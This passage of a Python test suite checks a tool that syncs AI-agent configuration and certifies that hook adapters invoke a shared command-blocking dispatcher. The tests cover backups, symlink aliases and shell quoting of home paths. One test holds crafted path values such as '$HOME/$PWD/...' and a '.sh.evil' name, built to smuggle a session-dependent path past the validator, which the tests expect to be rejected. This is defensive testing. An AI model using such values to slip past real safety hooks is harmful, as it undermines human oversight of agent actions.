                    "PreToolUse": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": (
                                        "python D:/custom/dispatch.py --event pre "
                                        "--runtime codex"
                                    ),
                                }
                            ]
                        }
                    ]
                }
            }
        )
        hooks_path = codex_home / "hooks.json"
        hooks_path.write_text(original, encoding="utf-8")
        args = SimpleNamespace(
            config_root=str(config_root),
            codex_home=str(codex_home),
            claude_home=str(root / "claude-home"),
            skills_home=str(root / "skills-home"),
            apply=True,
        )
        with self.assertRaises(harness.HarnessError):
            harness.sync_global(args)
        self.assertEqual(hooks_path.read_text(encoding="utf-8"), original)

    def test_sync_global_does_not_replace_identical_skill(self) -> None:
        _source_skill, target_skill, _skills_home, args = (
            self.make_sync_global_skill_fixture("identical-skill")
        )
        with mock.patch.object(
            harness.shutil,
            "rmtree",
            side_effect=AssertionError("identical skill should not be removed"),
        ):
            self.assertEqual(harness.sync_global(args), 0)

        self.assertEqual(
            (target_skill / "SKILL.md").read_text(encoding="utf-8"), "# sample\n"
        )

    def test_sync_global_replaces_path_content_digest_alias(self) -> None:
        source_skill, target_skill, skills_home, args = (
            self.make_sync_global_skill_fixture("digest-alias")
        )
        (source_skill / "ab").write_bytes(b"c")
        (target_skill / "a").write_bytes(b"bc")

        self.assertNotEqual(
            harness.tree_digest(source_skill), harness.tree_digest(target_skill)
        )
        self.assertEqual(harness.sync_global(args), 0)

        self.assertEqual((target_skill / "ab").read_bytes(), b"c")
        self.assertFalse((target_skill / "a").exists())
        backups = list((skills_home / ".harness-backups").glob("*/sample"))
        self.assertEqual(len(backups), 1)
        self.assertEqual((backups[0] / "a").read_bytes(), b"bc")

    def test_sync_global_replaces_mismatched_empty_directories(self) -> None:
        source_skill, target_skill, skills_home, args = (
            self.make_sync_global_skill_fixture("empty-directories")
        )
        (source_skill / "assets").mkdir()
        (target_skill / "obsolete").mkdir()

        self.assertNotEqual(
            harness.tree_digest(source_skill), harness.tree_digest(target_skill)
        )
        self.assertEqual(harness.sync_global(args), 0)

        self.assertTrue((target_skill / "assets").is_dir())
        self.assertFalse((target_skill / "obsolete").exists())
        backups = list((skills_home / ".harness-backups").glob("*/sample"))
        self.assertEqual(len(backups), 1)
        self.assertTrue((backups[0] / "obsolete").is_dir())

    def test_sync_global_rejects_directory_alias_before_writes(self) -> None:
        source_skill, target_skill, skills_home, args = (
            self.make_sync_global_skill_fixture("directory-alias")
        )
        (source_skill / "assets").mkdir()
        (source_skill / "assets" / "data").write_text("current\n", encoding="utf-8")
        external = Path(self.temp.name) / "external-assets"
        external.mkdir()
        (external / "data").write_text("current\n", encoding="utf-8")
        alias = target_skill / "assets"
        remove_alias = self.make_directory_alias(external, alias)
        try:
            self.assert_sync_global_rejects_alias_without_writes(
                args, alias, skills_home
            )
            self.assertEqual(
                (external / "data").read_text(encoding="utf-8"), "current\n"
            )
        finally:
            if harness.path_is_alias(alias):
                remove_alias()

    def test_sync_global_rejects_file_alias_before_writes(self) -> None:
        source_skill, target_skill, skills_home, args = (
            self.make_sync_global_skill_fixture("file-alias")
        )
        source_file = source_skill / "data"
        source_file.write_text("current\n", encoding="utf-8")
        external = Path(self.temp.name) / "external-data"
        external.write_text("current\n", encoding="utf-8")
        alias = target_skill / "data"
        try:
            alias.symlink_to(external)
        except OSError as exc:
            self.skipTest(f"file symlinks unavailable: {exc}")
        try:
            self.assert_sync_global_rejects_alias_without_writes(
                args, alias, skills_home
            )
            self.assertEqual(external.read_text(encoding="utf-8"), "current\n")
        finally:
            if harness.path_is_alias(alias):
                alias.unlink()

    def test_sync_global_rejects_root_alias_before_writes(self) -> None:
        source_skill, target_skill, skills_home, args = (
            self.make_sync_global_skill_fixture("root-alias")
        )
        (source_skill / "data").write_text("current\n", encoding="utf-8")
        (target_skill / "SKILL.md").unlink()
        target_skill.rmdir()
        external = Path(self.temp.name) / "external-skill"
        external.mkdir()
        (external / "SKILL.md").write_text("# sample\n", encoding="utf-8")
        (external / "data").write_text("current\n", encoding="utf-8")
        remove_alias = self.make_directory_alias(external, target_skill)
        try:
            self.assert_sync_global_rejects_alias_without_writes(
                args, target_skill, skills_home
            )
            self.assertEqual(
                (external / "data").read_text(encoding="utf-8"), "current\n"
            )
        finally:
            if harness.path_is_alias(target_skill):
                remove_alias()

    def test_sync_global_preserves_same_second_backup_sets(self) -> None:
        root = Path(self.temp.name)
        config_root = root / "config"
        codex_source = config_root / "codex"
        source_skill = codex_source / "skills" / "sample"
        source_skill.mkdir(parents=True)
        (codex_source / "AGENTS.md").write_text("canonical laws\n", encoding="utf-8")
        (source_skill / "SKILL.md").write_text("canonical skill\n", encoding="utf-8")

        codex_home = root / "codex-home"
        claude_home = root / "claude-home"
        skills_home = root / "skills-home"
        (claude_home / "hooks").mkdir(parents=True)
        (skills_home / "sample").mkdir(parents=True)
        codex_home.mkdir()
        (codex_home / "AGENTS.md").write_text("original laws\n", encoding="utf-8")
        (claude_home / "hooks" / "dispatch.py").write_text(
            "original dispatcher\n", encoding="utf-8"
        )
        (claude_home / "hooks" / "smoke_test.py").write_text(
            "original smoke\n", encoding="utf-8"
        )
        (skills_home / "sample" / "SKILL.md").write_text(
            "original skill\n", encoding="utf-8"
        )
        args = SimpleNamespace(
            config_root=str(config_root),
            codex_home=str(codex_home),
            claude_home=str(claude_home),
            skills_home=str(skills_home),
            apply=True,
        )
        frozen = datetime(2026, 7, 14, 4, 0, tzinfo=timezone.utc)

        class FrozenDatetime:
            @classmethod
            def now(cls, _tz: object) -> datetime:
                return frozen

        with mock.patch.object(harness, "datetime", FrozenDatetime):
            self.assertEqual(harness.sync_global(args), 0)
            (codex_home / "AGENTS.md").write_text(
                "intermediate laws\n", encoding="utf-8"
            )
            (skills_home / "sample" / "SKILL.md").write_text(
                "intermediate skill\n", encoding="utf-8"
            )
            self.assertEqual(harness.sync_global(args), 0)

        first = codex_home / "backups" / "20260714T040000Z"
        second = codex_home / "backups" / "20260714T040000Z-01"
        self.assertEqual(
            (first / "AGENTS.md").read_text(encoding="utf-8"), "original laws\n"
        )
        self.assertEqual(
            (second / "AGENTS.md").read_text(encoding="utf-8"),
            "intermediate laws\n",
        )
        first_skill = skills_home / ".harness-backups" / first.name / "sample"
        second_skill = skills_home / ".harness-backups" / second.name / "sample"
        self.assertEqual(
            (first_skill / "SKILL.md").read_text(encoding="utf-8"),
            "original skill\n",
        )
        self.assertEqual(
            (second_skill / "SKILL.md").read_text(encoding="utf-8"),
            "intermediate skill\n",
        )

    @staticmethod
    def wrapper_adapter_text(pin: str, posix_wrapper: str, windows_wrapper: str) -> str:
        return json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "matcher": "^Bash$",
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": (
                                        f"expected={pin}; "
                                        "dispatcher=$HOME/.claude/hooks/dispatch.py; "
                                        f"/bin/sh {posix_wrapper}"
                                    ),
                                    "commandWindows": (
                                        f"$expected='{pin}'; "
                                        "$d=$env:USERPROFILE"
                                        "+'/.claude/hooks/dispatch.py'; "
                                        f"& {windows_wrapper}"
                                    ),
                                    "timeout": 5,
                                }
                            ],
                        }
                    ]
                }
            }
        )

    @staticmethod
    def direct_adapter_text(posix_command: str, windows_command: str) -> str:
        return json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "matcher": "^Bash$",
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": posix_command,
                                    "commandWindows": windows_command,
                                    "timeout": 5,
                                }
                            ],
                        }
                    ]
                }
            }
        )

    def test_doctor_states_the_marker_is_audit_only(self) -> None:
        # Issue #18: the adapter's expected=<sha256> value is a static audit
        # marker, not runtime byte enforcement. Nothing may report it as the
        # latter, in code or in docs.
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 0, output)
        self.assertIn(
            "the expected=<sha256> value is an audit-only marker, never "
            "verified at runtime",
            output,
        )

    def test_shipped_docs_call_the_marker_audit_only(self) -> None:
        root = Path(harness.__file__).resolve().parent
        for name in ("README.md", "SPECS.md", "BLUEPRINT.md"):
            with self.subTest(document=name):
                text = (root / name).read_text(encoding="utf-8").lower()
                self.assertIn("audit-only", text)

    def test_doctor_names_an_unpinned_adapter(self) -> None:
        repo = self.make_repo()
        self.write_hooks(
            repo,
            self.direct_adapter_text(
                'python3 "$HOME/.claude/hooks/dispatch.py" --event pre --runtime codex',
                "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex",
            ),
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex adapter contract", output)
        self.assertIn("declares no expected=<sha256> audit marker", output)
        self.assertIn(".command", output)
        self.assertIn(".commandWindows", output)

    def test_doctor_names_a_stale_adapter_marker(self) -> None:
        repo = self.make_repo()
        stale = "b" * 64
        self.write_hooks(
            repo,
            self.direct_adapter_text(
                f'expected={stale}; python3 "$HOME/.claude/hooks/dispatch.py" '
                "--event pre --runtime codex",
                f"$expected='{stale}'; py -3 "
                "$env:USERPROFILE/.claude/hooks/dispatch.py "
                "--event pre --runtime codex",
            ),
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex adapter contract", output)
        self.assertIn(f"declares a stale audit marker {stale[:12]}...", output)
        self.assertNotIn("declares no expected=<sha256> audit marker", output)

    def test_doctor_names_a_missing_runtime_flag(self) -> None:
        repo = self.make_repo()
        pin = harness.normalized_text_sha256(
            Path(harness.__file__).resolve().parent
            / "templates"
            / "hooks"
            / "dispatch.py"
        )
        self.write_hooks(
            repo,
            self.direct_adapter_text(
                f'expected={pin}; python3 "$HOME/.claude/hooks/dispatch.py" '
                "--event pre",
                f"$expected='{pin}'; py -3 "
                "$env:USERPROFILE/.claude/hooks/dispatch.py --event pre",
            ),
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex adapter contract", output)
        self.assertIn("never passes --runtime codex", output)

    def test_doctor_inventories_a_vendored_dispatcher(self) -> None:
        repo = self.make_repo()
        pin = harness.normalized_text_sha256(
            Path(harness.__file__).resolve().parent
            / "templates"
            / "hooks"
            / "dispatch.py"
        )
        self.write_hooks(
            repo,
            self.direct_adapter_text(
                f"expected={pin}; python3 .claude/hooks/dispatch.py "
                "--event pre --runtime codex",
                f"$expected='{pin}'; py -3 .claude/hooks/dispatch.py "
                "--event pre --runtime codex",
            ),
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        # A vendored dispatcher is an ESTATE-recorded choice, so it reads as
        # inventory rather than a contract gap.
        self.assertIn("[ok] Codex adapter contract", output)
        self.assertIn("names a repo-local dispatcher copy", output)
        self.assertNotIn("contract gap", output)
        # It is still not a certifiable floor: the shape check rejects it.
        self.assertEqual(result, 1)
        self.assertIn("[FAIL] project Codex floor", output)

    def test_join_path_dispatcher_is_not_called_a_repo_local_copy(self) -> None:
        # PowerShell's `Join-Path $env:USERPROFILE '.claude/hooks/dispatch.py'`
        # is a shared home-anchored dispatcher the floor recognizer accepts;
        # the inventory must not contradict it by naming a repo-local copy.
        pin = "a" * 64
        shared = (
            f"$dispatcher=Join-Path $env:USERPROFILE '.claude/hooks/dispatch.py'; "
            f"$expected='{pin}'; & py -3 $dispatcher --event pre --runtime codex"
        )
        gaps, inventory = harness.codex_adapter_command_notes(shared, "win", pin)
        self.assertEqual(gaps, [])
        self.assertEqual(inventory, [])
        # A genuinely repo-local dispatcher is still inventoried.
        vendored = (
            f"$expected='{pin}'; & py -3 .claude/hooks/dispatch.py "
            "--event pre --runtime codex"
        )
        _gaps, vendored_inventory = harness.codex_adapter_command_notes(
            vendored, "win", pin
        )
        self.assertIn(
            "win names a repo-local dispatcher copy rather than the shared "
            "home-anchored one",
            vendored_inventory,
        )

    def test_doctor_says_when_no_adapter_handler_was_inspected(self) -> None:
        repo = self.make_repo()
        # A hook source with a PreToolUse handler that is not a floor adapter at
        # all: doctor must not report a current audit marker it never saw.
        self.write_hooks(
            repo,
            json.dumps(
                {
                    "hooks": {
                        "PreToolUse": [
                            {
                                "matcher": "^Bash$",
                                "hooks": [
                                    {
                                        "type": "command",
                                        "command": "python3 tools/lint_gate.py",
                                        "commandWindows": "py -3 tools/lint_gate.py",
                                    }
                                ],
                            }
                        ]
                    }
                }
            ),
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[ok] Codex adapter contract", output)
        self.assertIn("declare no handler that reaches the shared floor", output)
        self.assertNotIn("declare a current audit marker", output)
        self.assertIn("[FAIL] project Codex floor", output)

    def test_doctor_reports_an_absent_platform_command_as_absent(self) -> None:
        repo = self.make_repo()
        pin = harness.normalized_text_sha256(
            Path(harness.__file__).resolve().parent
            / "templates"
            / "hooks"
            / "dispatch.py"
        )
        self.write_hooks(
            repo,
            json.dumps(
                {
                    "hooks": {
                        "PreToolUse": [
                            {
                                "matcher": "^Bash$",
                                "hooks": [
                                    {
                                        "type": "command",
                                        "command": (
                                            f"expected={pin}; python3 "
                                            '"$HOME/.claude/hooks/dispatch.py" '
                                            "--event pre --runtime codex"
                                        ),
                                        "timeout": 5,
                                    }
                                ],
                            }
                        ]
                    }
                }
            ),
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] project Codex floor", output)
        self.assertIn(".commandWindows declares no command for this platform", output)
        # The absence is reported once, not as three separate deviations of a
        # command that does not exist.
        self.assertNotIn(".commandWindows never passes", output)
        self.assertNotIn(".commandWindows declares no expected=<sha256>", output)

    def test_doctor_ignores_a_commented_dispatcher_mention_in_a_sibling(self) -> None:
        repo = self.make_repo()
        valid_adapter = json.loads(
            (
                Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
            ).read_text(encoding="utf-8")
        )
        # A second, unrelated PreToolUse handler that only MENTIONS the
        # dispatcher inside a comment. The floor candidate count already
        # strips comments, so the contract check must agree or a lint gate
        # next door turns a valid adapter into a failure.
        valid_adapter["hooks"]["PreToolUse"].append(
            {
                "matcher": "^Bash$",
                "hooks": [
                    {
                        "type": "command",
                        "command": "echo hi # see ~/.claude/hooks/dispatch.py",
                        "commandWindows": "echo hi # see ~/.claude/hooks/dispatch.py",
                    }
                ],
            }
        )
        self.write_hooks(repo, json.dumps(valid_adapter))

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex adapter contract", output)
        self.assertIn("[ok] project Codex floor", output)
        self.assertNotIn("contract gap", output)

    def test_doctor_inventories_wrapper_flag_delegation(self) -> None:
        repo = self.make_repo()
        pin = harness.normalized_text_sha256(
            Path(harness.__file__).resolve().parent
            / "templates"
            / "hooks"
            / "dispatch.py"
        )
        self.write_hooks(
            repo,
            self.wrapper_adapter_text(
                pin, ".codex/invoke_deny_floor.sh", ".codex/invoke_deny_floor.ps1"
            ),
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex adapter contract", output)
        self.assertIn("leaves --runtime codex to a repo wrapper", output)
        self.assertNotIn("contract gap", output)

    def test_repo_floor_rejects_session_cwd_relative_wrapper_paths(self) -> None:
        pin = "a" * 64
        cases = (
            (".codex/invoke_deny_floor.sh", ".codex/invoke_deny_floor.ps1"),
            ("tools/invoke_deny_floor.sh", "tools/invoke_deny_floor.ps1"),
            ("$w/invoke_deny_floor.sh", "$w/invoke_deny_floor.ps1"),
        )
        for posix_wrapper, windows_wrapper in cases:
            with self.subTest(wrapper=posix_wrapper):
                text = self.wrapper_adapter_text(pin, posix_wrapper, windows_wrapper)
                # Codex resolves the wrapper from the session cwd, so a relative
                # path only certifies when that is the hook source root.
                self.assertEqual(len(harness.repo_codex_floor_groups(text, pin)), 1)
                self.assertEqual(
                    harness.repo_codex_floor_groups(
                        text, pin, reject_relative_wrapper=True
                    ),
                    [],
                )

    def test_repo_floor_keeps_home_anchored_wrappers_outside_the_source_root(
        self,
    ) -> None:
        # A HOME-anchored wrapper names the same file from every session cwd,
        # so a subdirectory or linked-worktree audit must still certify it
        # instead of reporting zero valid floor handlers.
        pin = "a" * 64
        cases = (
            ("~/work/repo/invoke_deny_floor.sh", "~/work/repo/invoke_deny_floor.ps1"),
            (
                # POSIX: quoted, because an unquoted expansion is field-split.
                '"$HOME/work/repo/invoke_deny_floor.sh"',
                "$env:USERPROFILE/work/repo/invoke_deny_floor.ps1",
            ),
        )
        for posix_wrapper, windows_wrapper in cases:
            with self.subTest(wrapper=posix_wrapper):
                text = self.wrapper_adapter_text(pin, posix_wrapper, windows_wrapper)
                for reject in (False, True):
                    self.assertEqual(
                        len(
                            harness.repo_codex_floor_groups(
                                text, pin, reject_relative_wrapper=reject
                            )
                        ),
                        1,
                        posix_wrapper,
                    )

    def test_home_anchored_wrapper_bound_to_a_variable_survives(self) -> None:
        pin = "a" * 64
        text = json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "matcher": "^Bash$",
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": (
                                        f"expected={pin}; "
                                        "dispatcher=$HOME/.claude/hooks/dispatch.py; "
                                        "w=$HOME/work/repo/invoke_deny_floor.sh; "
                                        "/bin/sh $w"
                                    ),
                                    "commandWindows": (
                                        f"$expected='{pin}'; "
                                        "$d=$env:USERPROFILE"
                                        "+'/.claude/hooks/dispatch.py'; "
                                        '$w="$env:USERPROFILE'
                                        '/work/repo/invoke_deny_floor.ps1"; '
                                        "& $w"
                                    ),
                                    "timeout": 5,
                                }
                            ],
                        }
                    ]
                }
            }
        )
        for reject in (False, True):
            self.assertEqual(
                len(
                    harness.repo_codex_floor_groups(
                        text, pin, reject_relative_wrapper=reject
                    )
                ),
                1,
            )

    def test_home_anchored_wrapper_grammar_rejects_cwd_smuggling(self) -> None:
        # The relaxation must not let a cwd-dependent expansion ride in behind
        # the home anchor, nor accept a sibling script name.
        for token in (
            "$HOME/$PWD/invoke_deny_floor.sh",
            "$HOME/${cwd}/invoke_deny_floor.sh",
            "$HOMEDIR/work/invoke_deny_floor.sh",
            "$HOME/work/invoke_deny_floor.sh.evil",
        ):
            with self.subTest(token=token):
                self.assertFalse(
                    harness.token_is_wrapper(token, set(), reject_relative=True), token
                )
                self.assertFalse(
                    harness.value_binds_anchored_floor_path(
                        token, reject_relative_wrapper=True
                    ),
                    token,
                )

    def test_a_powershell_home_anchor_is_not_cwd_independent_on_posix(self) -> None:
        # `$env:USERPROFILE` is PowerShell-only: a POSIX shell expands `$env`
        # to nothing and runs `:USERPROFILE/...`, so the floor never starts.
        # Certifying it from a foreign cwd would be a false green.
        value = "$env:USERPROFILE/work/repo/invoke_deny_floor.sh"
        self.assertFalse(
            harness.value_binds_anchored_floor_path(
                value, reject_relative_wrapper=True, windows=False
            )
        )
        self.assertTrue(
            harness.value_binds_anchored_floor_path(
                value, reject_relative_wrapper=True, windows=True
            )
        )
        self.assertFalse(
            harness.token_is_wrapper(value, set(), reject_relative=True, windows=False)
        )
        self.assertTrue(
            harness.token_is_wrapper(value, set(), reject_relative=True, windows=True)
        )
        # `$HOME` and `~` expand in both shells, so they are accepted on both.
        for portable in (
            "$HOME/work/repo/invoke_deny_floor.sh",
            "~/work/repo/invoke_deny_floor.sh",
        ):
            for windows in (False, True):
                with self.subTest(value=portable, windows=windows):
                    self.assertTrue(
                        harness.value_binds_anchored_floor_path(
                            portable, reject_relative_wrapper=True, windows=windows
                        )
                    )

    def test_a_single_quoted_home_anchor_never_expands(self) -> None:
        # Single quotes suppress expansion in BOTH sh and PowerShell, so the
        # shell invokes a literal `$HOME` directory and the floor never runs.
        for value in (
            "'$HOME/work/repo/invoke_deny_floor.sh'",
            "'~/work/repo/invoke_deny_floor.sh'",
            "'$env:USERPROFILE/work/repo/invoke_deny_floor.ps1'",
        ):
            for windows in (False, True):
                with self.subTest(value=value, windows=windows):
                    self.assertFalse(
                        harness.value_binds_anchored_floor_path(
                            value, reject_relative_wrapper=True, windows=windows
                        ),
                        value,
                    )
        # A double-quoted variable still expands; a double-quoted `~` does not.
        self.assertTrue(
            harness.value_binds_anchored_floor_path(
                '"$HOME/work/repo/invoke_deny_floor.sh"', reject_relative_wrapper=True
            )
        )
        self.assertFalse(
            harness.value_binds_anchored_floor_path(
                '"~/work/repo/invoke_deny_floor.sh"', reject_relative_wrapper=True
            )
        )

    def test_a_quoted_or_escaped_wrapper_anchor_is_not_certified(self) -> None:
        # The same rule at the invocation site: `shlex` removes the quote or
        # escape, so the raw segment is consulted for the character that
        # introduced the token. Every one of these leaves the shell with a
        # literal, session-cwd-relative path.
        for segment in (
            "/bin/sh '$HOME/work/repo/invoke_deny_floor.sh'",
            "/bin/sh '~/work/repo/invoke_deny_floor.sh'",
            '/bin/sh "~/work/repo/invoke_deny_floor.sh"',
            "/bin/sh \\~/work/repo/invoke_deny_floor.sh",
            "/bin/sh \\$HOME/work/repo/invoke_deny_floor.sh",
        ):
            with self.subTest(segment=segment):
                self.assertFalse(
                    harness.segment_invokes_wrapper(
                        segment, set(), reject_relative=True
                    ),
                    segment,
                )
        # The spellings the shell really does expand into ONE operand certify.
        for segment in (
            '/bin/sh "$HOME/work/repo/invoke_deny_floor.sh"',
            "/bin/sh ~/work/repo/invoke_deny_floor.sh",
        ):
            with self.subTest(segment=segment):
                self.assertTrue(
                    harness.segment_invokes_wrapper(
                        segment, set(), reject_relative=True
                    ),
                    segment,
                )

    def test_an_unquoted_posix_home_operand_is_field_split(self) -> None:
        # `/bin/sh $HOME/…` hands sh several operands when HOME contains
        # whitespace, and the wrapper never starts. `"$HOME/…"` is one word;
        # tilde expansion results are exempt from field splitting.
        self.assertFalse(
            harness.segment_invokes_wrapper(
                "/bin/sh $HOME/work/repo/invoke_deny_floor.sh",
                set(),
                reject_relative=True,
            )
        )
        # PowerShell does not field-split, so the Windows command is unaffected.
        self.assertTrue(
            harness.segment_invokes_wrapper(
                "powershell -File $env:USERPROFILE/work/repo/invoke_deny_floor.ps1",
                set(),
                reject_relative=True,
                windows=True,
            )
        )
        # The assignment form is not an operand: an assignment RHS is not
        # field-split, so binding it bare and dereferencing it stays valid.
        self.assertTrue(
            harness.value_binds_anchored_floor_path(
                "$HOME/work/repo/invoke_deny_floor.sh", reject_relative_wrapper=True
            )
        )

    def test_a_lowercase_posix_home_variable_is_a_different_variable(self) -> None:
        # POSIX variable names are case-sensitive: `$home` normally expands to
        # nothing, so the command runs an absolute path with no home prefix.
        # The recognizer lowercases before matching, so the original spelling
        # has to be re-checked.
        for spelling in ("$home", "$HoMe", "${home}"):
            value = f"{spelling}/work/repo/invoke_deny_floor.sh"
            with self.subTest(spelling=spelling):
                self.assertFalse(
                    harness.value_binds_anchored_floor_path(
                        value, reject_relative_wrapper=True, windows=False
                    ),
                    value,
                )
                # PowerShell variables really are case-insensitive.
                self.assertTrue(
                    harness.value_binds_anchored_floor_path(
                        value, reject_relative_wrapper=True, windows=True
                    ),
                    value,
                )
        for exact in ("$HOME", "${HOME}"):
            with self.subTest(spelling=exact):
                self.assertTrue(
                    harness.value_binds_anchored_floor_path(
                        f"{exact}/work/repo/invoke_deny_floor.sh",
                        reject_relative_wrapper=True,
                    )
                )
        # Both still parse as a wrapper invocation when relativity is allowed.
        for segment in (
            "/bin/sh '$HOME/work/repo/invoke_deny_floor.sh'",
            "/bin/sh $HOME/work/repo/invoke_deny_floor.sh",
        ):
            with self.subTest(segment=segment):
                self.assertTrue(harness.segment_invokes_wrapper(segment, set()))

    def test_repo_floor_rejects_relative_wrapper_bound_to_a_variable(self) -> None:
        pin = "a" * 64
        text = json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "matcher": "^Bash$",
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": (
                                        f"expected={pin}; "
                                        "dispatcher=$HOME/.claude/hooks/dispatch.py; "
                                        "w=.codex/invoke_deny_floor.sh; /bin/sh $w"
                                    ),
                                    "commandWindows": (
                                        f"$expected='{pin}'; "
                                        "$d=$env:USERPROFILE"
                                        "+'/.claude/hooks/dispatch.py'; "
                                        "$w='.codex/invoke_deny_floor.ps1'; & $w"
                                    ),
                                    "timeout": 5,
                                }
                            ],
                        }
                    ]
                }
            }
        )
        self.assertEqual(len(harness.repo_codex_floor_groups(text, pin)), 1)
        # Indirection through a variable does not make the path resolvable.
        self.assertEqual(
            harness.repo_codex_floor_groups(text, pin, reject_relative_wrapper=True),
            [],
        )

    def test_reject_relative_wrapper_drops_only_the_wrapper_shape(self) -> None:
        # Guards the composition of the two pattern tuples: dropping the wrapper
        # must not quietly drop the home/system-anchored shapes with it.
        self.assertEqual(
            len(harness._FLOOR_VALUE_PATTERNS),
            len(harness._CWD_INDEPENDENT_FLOOR_VALUE_PATTERNS) + 1,
        )
        cwd_independent = (
            "$HOME/.claude/hooks/dispatch.py",
            "$env:USERPROFILE+'/.claude/hooks/dispatch.py'",
            "$env:SYSTEMROOT/py.exe",
        )
        for value in cwd_independent:
            with self.subTest(value=value):
                for reject in (False, True):
                    self.assertTrue(
                        harness.value_binds_anchored_floor_path(
                            value, reject_relative_wrapper=reject
                        ),
                        value,
                    )
        wrapper = ".codex/invoke_deny_floor.sh"
        self.assertTrue(harness.value_binds_anchored_floor_path(wrapper))
        self.assertFalse(
            harness.value_binds_anchored_floor_path(
                wrapper, reject_relative_wrapper=True
            )
        )

    def test_direct_adapters_survive_a_foreign_session_cwd(self) -> None:
        pin = "a" * 64
        text = json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "matcher": "^Bash$",
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": (
                                        f"expected={pin}; python3 "
                                        '"$HOME/.claude/hooks/dispatch.py" '
                                        "--event pre --runtime codex"
                                    ),
                                    "commandWindows": (
                                        f"$expected='{pin}'; py -3 "
                                        "$env:USERPROFILE/.claude/hooks/dispatch.py "
                                        "--event pre --runtime codex"
                                    ),
                                    "timeout": 5,
                                }
                            ],
                        }
                    ]
                }
            }
        )
        for reject_relative_wrapper in (False, True):
            with self.subTest(reject_relative_wrapper=reject_relative_wrapper):
                self.assertEqual(
                    len(
                        harness.repo_codex_floor_groups(
                            text,
                            pin,
                            reject_relative_wrapper=reject_relative_wrapper,
                        )
                    ),
                    1,
                )

    def test_doctor_certifies_a_relative_wrapper_from_the_source_root(self) -> None:
        repo = self.make_repo()
        pin = harness.normalized_text_sha256(
            Path(harness.__file__).resolve().parent
            / "templates"
            / "hooks"
            / "dispatch.py"
        )
        self.write_hooks(
            repo,
            self.wrapper_adapter_text(
                pin, ".codex/invoke_deny_floor.sh", ".codex/invoke_deny_floor.ps1"
            ),
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] project Codex floor", output)
        # The cwd dependency is a property of the adapter text, so it is
        # reported even from the cwd where it happens to resolve.
        self.assertIn("[ok] Codex adapter contract", output)
        self.assertIn("session-cwd-relative wrapper path", output)
        # The note names the hook source root as doctor resolved it; the exact
        # spelling of a temp path is platform-dependent (8.3 names on Windows,
        # /private on macOS), so assert the claim, not the rendering.
        self.assertIn("only for sessions started in", output)
        self.assertNotIn("contract gap", output)

    def test_doctor_reports_a_relative_wrapper_from_a_subdirectory_cwd(self) -> None:
        repo = self.make_repo()
        pin = harness.normalized_text_sha256(
            Path(harness.__file__).resolve().parent
            / "templates"
            / "hooks"
            / "dispatch.py"
        )
        self.write_hooks(
            repo,
            self.wrapper_adapter_text(
                pin, ".codex/invoke_deny_floor.sh", ".codex/invoke_deny_floor.ps1"
            ),
        )
        subdirectory = repo / "service"
        subdirectory.mkdir()

        result, output = self.run_doctor_with_fixture_globals(subdirectory)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] project Codex floor", output)
        self.assertIn("session cwd", output)
        self.assertIn("1 handler(s) bind a session-cwd-relative wrapper path", output)
        self.assertIn("0 project floor handler(s)", output)
        self.assertIn("0 current audit-marker handler(s)", output)

    def test_doctor_certifies_a_direct_adapter_from_a_subdirectory_cwd(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        subdirectory = repo / "service"
        subdirectory.mkdir()

        result, output = self.run_doctor_with_fixture_globals(subdirectory)

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] project Codex floor", output)
        self.assertNotIn("session-cwd-relative wrapper path", output)

    def test_repo_floor_finds_direct_and_hardened_adapters(self) -> None:
        direct = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": (
                        "python $HOME/.claude/hooks/dispatch.py "
                        "--event pre --runtime codex"
                    ),
                    "commandWindows": (
                        "py -3 $env:USERPROFILE/.claude/hooks/dispatch.py "
                        "--event=pre --runtime=codex"
                    ),
                }
            ],
        }
        wrapped = {
            "matcher": "^Bash$",
            "hooks": [
                {
                    "type": "command",
                    "command": (
                        "dispatcher=$HOME/.claude/hooks/dispatch.py; "
                        "/bin/sh .codex/invoke_deny_floor.sh"
                    ),
                    "commandWindows": (
                        "$d=$env:USERPROFILE+'/.claude/hooks/dispatch.py'; "
                        "& .codex/invoke_deny_floor.ps1"
                    ),
                }
            ],
        }
        current = json.dumps({"hooks": {"PreToolUse": [direct, wrapped]}})
        self.assertEqual(harness.repo_codex_floor_groups(current), [direct, wrapped])

    def test_repo_floor_decodes_windows_command_and_binds_pin(self) -> None:
        pin = "a" * 64
        windows_script = (
